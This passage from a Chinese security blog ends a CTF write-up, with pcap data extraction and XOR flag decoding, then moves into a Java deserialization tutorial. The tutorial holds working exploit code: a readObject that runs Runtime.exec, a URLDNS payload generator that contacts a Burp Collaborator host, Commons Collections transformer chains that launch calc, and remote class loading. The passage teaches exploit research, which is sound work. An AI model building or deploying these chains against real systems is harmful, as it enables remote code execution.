<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 pcap 文件中读取数据</span></span><br><span class="line">packets = <span class="built_in">open</span>(<span class="string">&#x27;capture.pcapng&#x27;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据并准备存储数据的列表</span></span><br><span class="line">data_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="comment"># 转换为字符串</span></span><br><span class="line">    packet_str = <span class="built_in">str</span>(packet)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式匹配 JSON 数据</span></span><br><span class="line">    matches = re.findall(<span class="string">r&#x27;\&#123;&quot;data&quot;:&quot;(\d+)&quot;\&#125;&#x27;</span>, packet_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将匹配的值添加到列表中</span></span><br><span class="line">    data_values.extend(matches)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印提取的 data 字段值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Extracted data values:&quot;</span>, data_values)</span><br></pre></td></tr></table></figure>
<p>然后解出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">KEY=<span class="string">&#x27;s3k@1_v3ry_w0w&#x27;</span></span><br><span class="line">t = [<span class="number">32</span>,<span class="number">118</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">120</span>,<span class="number">36</span>,<span class="number">69</span>,<span class="number">69</span>,<span class="number">70</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">40</span>,<span class="number">75</span>,<span class="number">65</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">67</span>,<span class="number">0</span>,<span class="number">78</span>,<span class="number">65</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">45</span>,<span class="number">5</span>,<span class="number">66</span>,<span class="number">5</span>,<span class="number">44</span>,<span class="number">11</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">67</span>,<span class="number">45</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">45</span>,<span class="number">5</span>,<span class="number">66</span>,<span class="number">40</span>,<span class="number">82</span>,<span class="number">18</span>,<span class="number">74</span>,<span class="number">31</span>,<span class="number">9</span>,<span class="number">107</span>,<span class="number">78</span>,<span class="number">0</span>,<span class="number">15</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(KEY[i%<span class="built_in">len</span>(KEY)])^t[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Java再会反序列化</title>
    <url>/2023/08/19/00-07-56/</url>
    <content><![CDATA[<h1>Java反序列化</h1>
<span id="more"></span>
<h2 id="反射">反射</h2>
<p>总的一句话，获得一个类的原型，然后可以操纵类的生成对象以及属性，方法的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRe</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="comment">//        类加载的4钟方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line"><span class="comment">//        Class p = Person.class;</span></span><br><span class="line"><span class="comment">//        Class p = person.getClass();</span></span><br><span class="line"><span class="comment">//        Class p = person.getClass().getClassLoader().loadClass(&quot;Person&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        实例化对象</span></span><br><span class="line"><span class="comment">//        p.newInstance();</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">s</span> <span class="operator">=</span> p.getConstructor(<span class="type">int</span>.class, String.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">c</span> <span class="operator">=</span> (Person) s.newInstance(<span class="number">123</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        获得属性以及修改全部的属性方式</span></span><br><span class="line"><span class="comment">//        Field[] a = p.getFields(); //获得public变量</span></span><br><span class="line"><span class="comment">//        Field[] aa = p.getDeclaredFields();   //获得全部的变量</span></span><br><span class="line"><span class="comment">//        for(Field f:aa)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> p.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(c,<span class="string">&quot;321&quot;</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        获得以及调用方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> p.getMethod(<span class="string">&quot;test&quot;</span>, String.class);</span><br><span class="line">        method.invoke(c,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="序列化和反序列化">序列化和反序列化</h2>
<p>与php反序列化的构造不一样，php反序列化是通过终点反推起点，然后进行pop链子的构造</p>
<p>java的反序列化链子是通过反序列化的时候会自动调用readObject方法，然后去寻找入口类，再来构造链子</p>
<p>在readObjet中去寻找常见的方法</p>
<h2 id="URL链子分析">URL链子分析</h2>
<ol>
<li>HashMap的readObject下会调用hash方法然后会调用hashCode方法</li>
<li>URL的hashCode方法会调用handler.hashCode</li>
<li>handler.hashCode中存在getHostAddress发起恶意请求</li>
</ol>
<p>所以恶意链的构造就是实现URL-&gt;hashCode-&gt;handler.hashCode-&gt;getHostAddress，然后使用HashMap触发hashCode方法就行，也就是说在HashMap中添加URL对象，在触发HashMap的hashCode同时触发URL的hashCode。</p>
<p>但是需要对URL进行处理，在序列化的过程中不会触发DNS请求，在反序列化的时候实现DNS请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialization</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  <span class="comment">//入口</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://2iljqi25st6yxyqgj2watim54wanyc.burpcollaborator.net&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">urlfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  <span class="comment">//操作属性条件</span></span><br><span class="line">        urlfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        urlfield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);  <span class="comment">//放入对象</span></span><br><span class="line">        urlfield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CC链分析前置知识">CC链分析前置知识</h2>
<p>首先我们需要知道cc是指<code>Apache Commons Collections</code>，然后在cc链的利用中最重要的就是<code>Transformer</code>接口，然后在这个接口的实现类中，需要关注的是<code>ChainedTransformer</code>,<code>ConstantTransformer</code>,<code>InvokerTransformer</code>这三个类，那么暂时就不做恶意链的构造，而是先看一下怎么去使用这些类进行触发Runtime</p>
<h3 id="ConstantTransformer">ConstantTransformer</h3>
<p>实现了类对象的返回，作用主要在于存在transform方法，与ChainedTransformer可以实现链式调用</p>
<p>构造函数以及transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下用法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transform</span> <span class="operator">=</span> constantTransformer.transform(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        System.out.println(transform.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传入一个对象，然后调用transform方法返回一个对象</p>
<h3 id="InvokerTransformer">InvokerTransformer</h3>
<p>实现了一个类的方法的调用</p>
<p>构造方法以及transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<p>第一个传入类的方法名字</p>
<p>第二个传入方法名字的参数的列表</p>
<p>第三个传入实际对应方法的参数</p>
<p>然后在实际的运行中，会将三个参数进行初始化传入到类的成员变量，然后利用transform方法传入input类，获得该类的原型，对应的方法以及调用该方法，其中返回method.invoke(input, this.iArgs);，会返回一个Object</p>
<h3 id="ChainedTransformer">ChainedTransformer</h3>
<p>ChainedTransformer类实现了Transformer链式调用，就是将传入的列表都会进行调用transform方法，并且将上一个transform方法返回的类传递给下一个进行调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行对象转换操作</span></span><br><span class="line">        transformedChain.transform(<span class="literal">null</span>);<span class="comment">//这里为null的是 一开始的object为runtime类，而getRuntime则不需要参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>换一种写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(<span class="literal">null</span>);  <span class="comment">//得到Runtime.class的实例 相当于Class clazz = Class.forName(&quot;java.lang.Runtime&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">        ).transform(r1);   <span class="comment">//调用Runtime的getRuntime方法获得对象 相当于clazz.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">        ).transform(r2);  <span class="comment">//相当于实例化自身就是调用了getRuntime，上面的三个就是实现了Runtime runtime = Runtime.getRuntime();，在r3的地方实现了new的操作，前两个相当于获得了必要的组件</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">r4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;); </span><br><span class="line"></span><br><span class="line">        r4.transform(r3);<span class="comment">//相当于runtime.exec(&quot;calc&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>与质朴的反射对比，transform会比较抽象一下，但是只要明白用ConstantTransformer开头，然后使用InvokerTransformer方法进行不断调用获得必要的组件，返回的对象都包含之前的迭代信息，通过invoke方法成功实例化对象那么基本上就清晰很多了，接下来进行cc链的分析</p>
<h3 id="字节码加载">字节码加载</h3>
<h4 id="URLClassLoader">URLClassLoader</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8090/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        Class&lt;?&gt; c = classLoader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;aseda&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以配合其他的漏洞进行攻击</p>
<h4 id="defineClass">defineClass</h4>
<p>方式一</p>
<p>麻烦</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHgoABgAPCQAQABEIABIKABMAFAcAFQcAFgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAXAQAKU291cmNlRmlsZQEACkhlbGxvLmphdmEMAAcACAcAGAwAGQAaAQAFYXNlZGEHABsMABwAHQEABUhlbGxvAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAAQABAAFAAwABgALAAAABAABAAwAAQANAAAAAgAO&quot;</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方式二</p>
